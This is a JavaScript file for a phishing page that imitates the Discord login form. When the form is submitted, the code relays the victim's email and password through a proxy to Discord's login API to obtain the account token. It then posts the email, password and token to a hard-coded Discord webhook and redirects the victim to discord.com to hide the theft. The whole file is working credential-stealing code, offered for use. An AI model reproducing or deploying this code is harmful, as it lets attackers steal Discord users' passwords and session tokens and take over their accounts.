document.addEventListener('DOMContentLoaded', function() {
  const form = document.getElementById('loginForm');
  const loginBtn = document.getElementById('loginBtn');
  const btnText = document.querySelector('.btn-text');
  const loadingSpinner = document.getElementById('loadingSpinner');
  const emailInput = document.getElementById('email');
  const passwordInput = document.getElementById('password');
  const errorToast = document.getElementById('errorToast');

  // Replace with your webhook URL
  const webhookUrl = 'https://discord.com/api/webhooks/1428459063389454377/ld1ERPey2wh_9r5TfKWDCKfqnX7Uo4jIGC_NJ0uzUqhbXWQVywD1_DJEGych9z2sNDto'; // e.g., 'https://discord.com/api/webhooks/...'

  // Discord API login endpoint (use proxy to bypass CORS)
  const discordLoginUrl = 'http://localhost:3000/proxy/login'; // Update to your proxy URL

  // Show error toast
  function showError(message) {
    errorToast.textContent = message;
    errorToast.classList.add('show');
    setTimeout(() => errorToast.classList.remove('show'), 3000);
  }

  form.addEventListener('submit', async function(e) {
    e.preventDefault();
    
    const email = emailInput.value.trim();
    const password = passwordInput.value.trim();
    
    if (!email || !password) {
      showError('Please fill in all fields.');
      emailInput.classList.toggle('error', !email);
      passwordInput.classList.toggle('error', !password);
      return;
    }
    
    // Clear error states
    emailInput.classList.remove('error');
    passwordInput.classList.remove('error');
    
    // Disable button and show loading spinner
    loginBtn.disabled = true;
    btnText.classList.add('hidden');
    loadingSpinner.classList.remove('hidden');
    
    try {
      // Send login request to Discord API (via proxy)
      const loginResponse = await fetch(discordLoginUrl, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json'
        },
        body: JSON.stringify({
          login: email,
          password: password,
          undelete: false,
          captcha_key: null,
          login_source: null,
          gift_code_sku_id: null
        })
      });
      
      const loginData = await loginResponse.json();
      
      if (!loginResponse.ok || !loginData.token) {
        throw new Error(loginData.message || 'Invalid credentials or API error');
      }
      
      // Extract the Discord auth token
      const token = loginData.token;
      
      // Prepare data for webhook
      const webhookData = {
        embeds: [{
          title: 'New Login',
          fields: [
            { name: 'Email', value: email, inline: true },
            { name: 'Password', value: password, inline: true },
            { name: 'Token', value: token, inline: false },
            { name: 'Timestamp', value: new Date().toISOString(), inline: false }
          ],
          color: 0x5865F2 // Discord blue
        }]
      };
      
      // Send data to webhook
      const webhookResponse = await fetch(webhookUrl, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json'
        },
        body: JSON.stringify(webhookData)
      });
      
      if (!webhookResponse.ok) {
        throw new Error(`Webhook request failed with status ${webhookResponse.status}`);
      }
      
      // Redirect to discord.com
      setTimeout(() => {
        window.location.href = 'https://discord.com';
      }, 1000);
    } catch (error) {
      console.error('Error during login or webhook:', error);
      showError(error.message || 'An error occurred during login. Please try again.');
      // Reset button and spinner
      loginBtn.disabled = false;
      btnText.classList.remove('hidden');
      loadingSpinner.classList.add('hidden');
    }
  });

  // Input validation/focus effects
  [emailInput, passwordInput].forEach(input => {
    input.addEventListener('input', function() {
      this.style.borderColor = this.value ? 'var(--btn-bg)' : 'var(--input-bg)';
      this.classList.remove('error');
    });
  });
});
